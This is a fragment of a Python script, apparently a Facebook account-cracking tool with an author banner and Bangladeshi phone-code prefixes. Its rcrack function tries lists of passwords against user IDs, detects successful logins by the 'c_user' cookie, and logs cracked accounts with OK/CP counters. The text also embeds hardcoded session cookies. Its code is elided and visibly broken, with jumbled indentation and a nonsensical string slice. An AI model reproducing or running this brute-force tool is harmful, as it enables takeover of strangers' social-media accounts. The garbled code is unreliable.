...
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[ 󰟱 ]  \033[1;32mCREATED BY\33    :  \033[1;33mAJMIR HOSSAIN\33[0;m\033[1;32m
\033[1;32m[ 󰟱 ]  \033[1;32mFACEBOK      : \033[1;34m  Ajmir Hossain 
\033[1;32m[ 󰟱 ]  \033[1;32mGITHUB       :  \033[1;35m Ajmirhossain000
\033[1;32m[ 󰟱 ]  \033[1;32mTOOL VIRSION :  \033[1;36m1.0.0
\033[1;32m[ 󰟱 ]  \033[1;32mTOOL TYPE    : \033[1;32m FREE
\033[1;92m══════════════════════════════════════════════════════
""")
...
def i():
    ...
    jalan (xxx)
    jalan('\033[1;94m─────────────────────────────────────────────────────')
    jalan('\033[1;92m[\033[1;92m✔︎\033[1;91m]\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            import requests
cookies = {
    'datr': 'ID07ZSEAr0_jElz53lcKSk8A',
    'sb': 'ID07ZQ6VuMhF-yU9XKK0N9am',
    'm_pixel_ratio': '2.75',
    'wd': '393x736',
    'fr': '0cXbbDiNTj2pjeFv4..BlOz0g.9B.AAA.0.0.BlO04X.AWXIAIwYGSo',
}
...
headers = {
    ...
    # 'cookie': 'datr=ID07ZSEAr0_jElz53lcKSk8A; sb=ID07ZQ6VuMhF-yU9XKK0N9am; m_pixel_ratio=2.75; wd=393x736; fr=0cXbbDiNTj2pjeFv4..BlOz0g.9B.AAA.0.0.BlO04X.AWXIAIwYGSo',
    'dpr': '2.75',
...
response = requests.get('https://m.facebook.com/', cookies=cookies, headers=headers)
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:56]
                print('    \33[1;31m(AJMIR-CP•)  ' +uid+ ' | ' +ps+           '  \33[1;33m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[AJMIR] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
